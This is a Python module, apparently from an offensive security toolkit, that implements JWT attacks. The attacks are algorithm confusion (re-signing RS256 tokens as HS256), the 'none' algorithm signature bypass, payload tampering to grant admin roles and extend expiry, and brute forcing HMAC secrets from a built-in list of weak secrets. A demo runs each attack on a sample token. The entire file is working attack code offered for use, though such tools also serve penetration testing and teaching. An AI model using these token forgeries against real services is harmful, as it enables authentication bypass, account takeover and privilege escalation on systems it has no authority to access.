#!/usr/bin/env python3
"""
JWT Manipulation Module
Advanced JWT attack techniques.

REAL-WORLD ATTACKS:
- Algorithm confusion (RS256 → HS256)
- Claims tampering (exp, role, user_id)
- Secret brute force (weak secrets)
- None algorithm bypass
"""

import base64
import json
import hmac
import hashlib
from typing import Dict, Optional, List


class JWTManipulator:
    """Advanced JWT manipulation and exploitation"""

    @staticmethod
    def decode_jwt(token: str) -> Optional[Dict]:
        """Decode JWT without verification"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            header = JWTManipulator._decode_part(parts[0])
            payload = JWTManipulator._decode_part(parts[1])

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2]
            }
        except:
            return None

    @staticmethod
    def _decode_part(part: str) -> Dict:
        """Decode base64url part"""
        # Add padding
        part += "=" * (4 - len(part) % 4)
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)

    @staticmethod
    def _encode_part(data: Dict) -> str:
        """Encode to base64url"""
        json_str = json.dumps(data, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode())
        return encoded.decode().rstrip("=")

    def algorithm_confusion_attack(self, token: str, public_key: Optional[str] = None) -> str:
        """
        Algorithm Confusion: RS256 → HS256

        If server uses RS256 (asymmetric):
        1. Get public key
        2. Create token with HS256 (symmetric)
        3. Sign with public key as secret

        Server verifies with public key → accepts!
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return token

        # Change algorithm to HS256
        decoded["header"]["alg"] = "HS256"

        # Re-encode
        header_encoded = self._encode_part(decoded["header"])
        payload_encoded = self._encode_part(decoded["payload"])

        # Sign with public key (if available)
        if public_key:
            signature = self._sign_hs256(
                f"{header_encoded}.{payload_encoded}",
                public_key
            )
        else:
            # Use empty or weak secret
            signature = self._sign_hs256(
                f"{header_encoded}.{payload_encoded}",
                ""
            )

        return f"{header_encoded}.{payload_encoded}.{signature}"

    def none_algorithm_attack(self, token: str) -> str:
        """
        None Algorithm Bypass

        Set alg: "none", remove signature
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return token

        decoded["header"]["alg"] = "none"

        header_encoded = self._encode_part(decoded["header"])
        payload_encoded = self._encode_part(decoded["payload"])

        # No signature for "none" algorithm
        return f"{header_encoded}.{payload_encoded}."

    def claims_tampering(
        self,
        token: str,
        modifications: Dict,
        secret: Optional[str] = None
    ) -> str:
        """
        Modify JWT claims

        Common modifications:
        - exp: Extend expiration
        - role: admin → superadmin
        - user_id: 123 → 1 (target admin)
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return token

        # Apply modifications
        for key, value in modifications.items():
            decoded["payload"][key] = value

        # Re-encode
        header_encoded = self._encode_part(decoded["header"])
        payload_encoded = self._encode_part(decoded["payload"])

        # Re-sign (if secret known)
        if secret:
            alg = decoded["header"].get("alg", "HS256")
            if alg == "HS256":
                signature = self._sign_hs256(
                    f"{header_encoded}.{payload_encoded}",
                    secret
                )
            else:
                # Can't sign without private key for RS256
                signature = decoded["signature"]
        else:
            signature = decoded["signature"]

        return f"{header_encoded}.{payload_encoded}.{signature}"

    def _sign_hs256(self, message: str, secret: str) -> str:
        """Sign with HMAC-SHA256"""
        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip("=")

    def brute_force_secret(
        self,
        token: str,
        wordlist: List[str]
    ) -> Optional[str]:
        """
        Brute force JWT secret

        Try common weak secrets
        """
        decoded = self.decode_jwt(token)
        if not decoded or decoded["header"].get("alg") != "HS256":
            return None

        parts = token.split(".")
        message = f"{parts[0]}.{parts[1]}"
        expected_signature = parts[2]

        for secret in wordlist:
            signature = self._sign_hs256(message, secret)
            if signature == expected_signature:
                return secret

        return None

    @staticmethod
    def get_common_secrets() -> List[str]:
        """Common weak JWT secrets"""
        return [
            "secret",
            "SECRET",
            "jwt_secret",
            "your-256-bit-secret",
            "dev-secret-key",
            "dev-secret-key-change-in-production-this-is-not-secure",
            "password",
            "123456",
            "admin",
            "changeme",
            "",  # Empty secret
        ]


if __name__ == "__main__":
    # Demo
    print("="*70)
    print("JWT MANIPULATION - DEMONSTRATION")
    print("="*70)

    manipulator = JWTManipulator()

    # Sample JWT
    sample_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    print("\n[*] Original Token:")
    decoded = manipulator.decode_jwt(sample_token)
    print(f"    Header: {decoded['header']}")
    print(f"    Payload: {decoded['payload']}")

    # Test 1: Algorithm confusion
    print("\n[*] Attack 1: Algorithm Confusion (HS256)")
    confused = manipulator.algorithm_confusion_attack(sample_token)
    print(f"    Modified: {confused[:50]}...")

    # Test 2: None algorithm
    print("\n[*] Attack 2: None Algorithm Bypass")
    none_token = manipulator.none_algorithm_attack(sample_token)
    print(f"    Modified: {none_token[:50]}...")

    # Test 3: Claims tampering
    print("\n[*] Attack 3: Claims Tampering")
    tampered = manipulator.claims_tampering(
        sample_token,
        {"role": "admin", "exp": 9999999999}
    )
    print(f"    Modified claims: role=admin, exp=9999999999")

    # Test 4: Secret brute force
    print("\n[*] Attack 4: Secret Brute Force")
    secrets = ["wrong", "secret", "password"]
    found = manipulator.brute_force_secret(sample_token, secrets)
    if found:
        print(f"    [!] Found secret: {found}")
    else:
        print(f"    [✗] Secret not in wordlist")

    print("\n" + "="*70)
    print("KEY INSIGHTS:")
    print("  • Algorithm confusion: RS256 → HS256 with public key")
    print("  • None algorithm: Remove signature validation")
    print("  • Claims tampering: Modify role, exp, user_id")
    print("  • Secret brute force: Weak secrets vulnerable")
    print("="*70)
